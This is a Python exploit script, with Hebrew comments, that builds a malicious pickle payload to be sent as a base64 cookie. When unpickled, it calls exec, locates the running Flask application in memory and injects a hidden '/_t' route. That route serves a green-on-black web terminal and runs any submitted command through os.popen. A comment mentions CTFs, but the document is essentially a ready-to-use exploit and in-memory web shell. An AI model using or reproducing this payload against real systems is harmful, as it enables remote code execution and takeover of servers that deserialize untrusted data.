import pickle
import base64

# הוצאתי את קוד ההזרקה למשתנה נפרד כדי שיהיה קל לקרוא ולערוך אותו
PAYLOAD_CODE = """
import sys, gc

# 1. חיפוש אובייקט ה-Flask בזכרון
app = None
for o in gc.get_objects():
    if o.__class__.__name__ == 'Flask' and hasattr(o, 'add_url_rule'):
        app = o
        break

if app:
    # 2. הגדרת הפונקציה במלואה - הכל קורה בפנים כדי למנוע שגיאות Scope
    def micro_term():
        import flask
        import os

        # הממשק הגרפי (שמרתי על העיצוב המקורי שלך)
        H = '''<body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
        <h2>⚡ MICRO TERMINAL ⚡</h2>
        <div id="o" style="height:70vh;overflow:auto;border:1px solid #333;padding:10px;white-space:pre-wrap"></div>
        <div style="display:flex;margin-top:10px">
        <span style="margin-right:10px">root@srv:~#</span>
        <input id="c" autofocus style="background:transparent;color:#0f0;border:none;width:80%;outline:none">
        </div>
        <script>
        c.onkeydown=e=>{if(e.key=='Enter'){
        fetch('/_t',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'c='+encodeURIComponent(c.value)})
        .then(r=>r.text()).then(t=>{o.innerHTML+='<br>&gt; '+c.value+'<br>'+t;c.value='';o.scrollTop=o.scrollHeight})
        }}</script></body>'''

        # הרצת פקודות בצורה בטוחה שתעבוד גם ב-Windows וגם ב-Linux
        if flask.request.method == 'POST':
            cmd = flask.request.form.get('c', '')
            try:
                # os.popen פשוט וורסטילי יותר ל-CTFs מאשר subprocess עם דגלים ספציפיים
                return os.popen(cmd).read()
            except Exception as e:
                return str(e)

        return H

    # 3. הזרקת הראוט ישירות לתוך המנוע של Flask
    try:
        from werkzeug.routing import Rule

        # רושמים את הפונקציה במאגר של Flask
        if 'micro_term' not in app.view_functions:
            app.view_functions['micro_term'] = micro_term

            # מוסיפים את הנתיב (Route)
            app.url_map.add(Rule('/_t', endpoint='micro_term', methods=['GET', 'POST']))
            print("[+] MINI TERM INJECTED AT /_t")
    except Exception as e:
        print("[DEBUG] Injection Failed:", e)
"""


class MiniTerm:
    def __reduce__(self):
        return (exec, (PAYLOAD_CODE,))


# מדפיס את העוגייה המורעלת
print(base64.b64encode(pickle.dumps(MiniTerm())).decode())